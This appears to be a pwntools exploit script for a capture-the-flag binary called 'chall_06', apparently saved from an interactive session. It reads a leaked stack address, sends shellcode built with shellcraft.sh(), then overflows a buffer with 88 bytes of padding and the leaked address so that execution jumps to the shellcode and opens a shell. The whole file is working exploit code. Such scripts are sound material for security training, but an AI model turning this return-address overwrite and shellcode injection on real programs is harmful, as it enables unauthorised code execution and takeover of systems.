# coding: utf-8
from pwn import *
p=process("./chall_06")
p.recvuntil(":")
var50h = p.recv()
var50h
var50h = int(var50h,16)
context.arch="amd64"
shellcode = asm(shellcraft.sh())
len(shellcode)
p.sendline(shellcode)
0x60
p.sendline(b'a'*88+p64(var50h))
p.interactive()
